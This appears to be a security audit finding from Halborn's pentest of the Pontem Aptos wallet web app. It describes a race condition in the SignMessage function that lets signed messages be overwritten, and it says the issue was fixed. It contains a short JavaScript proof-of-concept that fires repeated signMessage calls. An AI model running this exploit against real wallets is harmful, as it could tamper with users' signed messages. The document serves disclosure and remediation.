---
tags:
  - lang/move
  - platform/halborn
  - has/github
  - has/poc
  - severity/high
  - sector/wallet
protocol: "[[Aptos Wallet]]"
auditors:
  - "[[Halborn]]"
report: "https://www.halborn.com/audits/pontem-network/aptos-wallet-webapp-pentest"
genome:
  - "[[wrong-condition]]"
  - "[[role-bypass]]"
  - "[[cross-contract-state-consistency]]"
---
# RACE CONDITION ON SIGNED MESSAGE

- id: 50670
- impact: HIGH
- protocol: [[Aptos Wallet]]
- reporter: Halborn
- source: https://www.halborn.com/audits/pontem-network/aptos-wallet-webapp-pentest

## Summary


The `SignMessage` function in the Pontem Pitaka project had a bug that allowed attackers to manipulate the signed messages. This was caused by a lack of control over the function execution, which allowed multiple calls to be made in a short period of time. This could result in the content of the signed messages being overwritten. A sample exploit code is provided in the report. The impact and likelihood of this bug were both rated as 5 out of 10. The bug has now been fixed in the project's GitHub repository.

## Details

##### Description

The `SignMessage` exported function allowed an attacker to abuse the function and trigger a race condition state. The function did not control the function execution, allowing to execute multiple calls to the same function in a short period of time. This situation allowed an attacker to overwrite the content of the signed messages.

#### Exploit

```
async function exploitSign(){
for (i = 1; i <= 5; i++) {

window.pontem.signMessage(i)
  .then(result => {
   console.log('Signed Message', result)
  })
  .catch(e => console.log('Error', e))
}

window.pontem.signMessage('Test1')
  .then(result => {
   console.log('Signed Message', result)
  })
  .catch(e => console.log('Error', e))

await new Promise(r => setTimeout(r, 1000));

window.pontem.signMessage('Test2')
  .then(result => {
   console.log('Signed Message', result)
  })
  .catch(e => console.log('Error', e))
}

```

[Race condition on the signed messages](https://www.loom.com/share/5bfa58b4c02e42d087533d65001d7ecf)

##### Score

Impact: 5  
Likelihood: 5

##### Recommendation

`SOLVED`: The issue was solved in the following GitHub Pull Request ([Commit 45429fb617843ccfbbab62dec76c77a4001ea73d](https://github.com/pontem-network/pontem-pitaka/pull/113/commits/45429fb617843ccfbbab62dec76c77a4001ea73d)):
[Feature apt 643 #113](https://github.com/pontem-network/pontem-pitaka/pull/113)
